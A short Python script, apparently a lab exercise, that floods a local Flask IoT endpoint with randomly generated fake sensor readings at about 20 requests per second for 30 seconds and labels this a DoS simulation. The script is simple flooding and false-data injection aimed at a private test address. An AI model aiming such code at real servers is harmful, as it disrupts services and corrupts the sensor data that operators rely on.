import requests
import time
import random

# Replace this with your Flask server IP
FLASK_SERVER_URL = "http://192.168.53.242:5000/iot-data"

# Start time
start_time = time.time()
duration = 30  # seconds

while time.time() - start_time < duration:
    fake_data = {
        "temperature": random.uniform(20, 100),  # Random high/low values
        "humidity": random.uniform(10, 90),
        "soil_moisture": random.uniform(0, 100),
        "fan_status": random.choice([0, 1])
    }
    
    try:
        response = requests.post(FLASK_SERVER_URL, json=fake_data, timeout=1)
        print("Sent DoS request ->", response.status_code, response.text)
    except Exception as e:
        print("Request failed:", e)

    # Very little delay to simulate attack
    time.sleep(0.05)  # 20 requests per second approx.

print("DoS simulation complete.")
